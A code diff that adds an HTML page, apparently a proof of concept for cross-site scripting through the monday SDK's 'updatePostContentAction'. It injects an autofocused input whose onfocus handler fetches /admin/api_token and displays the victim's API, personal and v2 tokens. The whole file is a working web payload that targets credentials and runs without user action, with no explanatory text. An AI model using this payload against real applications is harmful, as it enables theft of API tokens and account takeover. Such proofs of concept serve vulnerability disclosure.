@@ -1,0 +1,12 @@
+<html>
+  <head>
+    <script src="https://cdn.jsdelivr.net/npm/monday-sdk-js/dist/main.js"></script>
+  </head>
+<body>
+  <script>
+    const monday = window.mondaySdk();
+    monday.execute("updatePostContentAction", { suggestedRephrase: '<input autofocus onfocus=\"fetch('/admin/api_token').then(response=>response.json()).then(data=>alert('api_token:'+data.api_token+'personal_api_token:'+data.personal_api_token+'api_v2_token:'+data.api_v2_token))\">'})
+  </script>
+  Hello
+</body>
+</html>
